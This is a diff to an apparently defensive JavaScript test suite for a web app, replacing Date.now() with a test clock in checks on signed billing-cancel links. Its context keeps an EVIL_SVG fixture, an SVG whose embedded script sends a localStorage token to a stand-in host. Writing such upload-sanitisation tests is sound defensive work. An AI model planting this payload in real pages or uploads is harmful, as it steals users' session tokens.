@@ -33,7 +33,8 @@ const ORG = "org_secure1";
 const ADMIN = "u_secure1_admin", STAFF = "u_secure1_staff";
 const ADMIN_EMAIL = "admin@secure1.example.org", STAFF_EMAIL = "staff@secure1.example.org";
 const DONOR = "d_secure1";
-const TODAY = new Date().toISOString().slice(0, 10);
+const { testNow, civilDay } = require("./clock");
+const TODAY = civilDay();
 
 const PNG_1x1 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
 const EVIL_SVG = Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>fetch("//x.invalid/?"+localStorage.npe_token)</script></svg>`).toString("base64");
@@ -144,9 +145,9 @@ async function fixtures() {
       const payload = Buffer.from(JSON.stringify(obj)).toString("base64url");
       return payload + "." + crypto.createHmac("sha256", secret).update("cancel:" + payload).digest("base64url");
     };
-    const old = await fetch(`${BASE}/billing/cancel/${mk({ cancelOrgId: ORG, exp: Date.now() - 86400000 })}`);
+    const old = await fetch(`${BASE}/billing/cancel/${mk({ cancelOrgId: ORG, exp: testNow() - 86400000 })}`);
     ok("an expired cancel link is refused (400)", old.status === 400, old.status);
-    const live = await fetch(`${BASE}/billing/cancel/${mk({ cancelOrgId: ORG, exp: Date.now() + 86400000 })}`);
+    const live = await fetch(`${BASE}/billing/cancel/${mk({ cancelOrgId: ORG, exp: testNow() + 86400000 })}`);
     ok("a current cancel link still opens the confirm page", live.status === 200, live.status);
 
     await api("POST", "/auth/forgot-password", null, { email: STAFF_EMAIL });
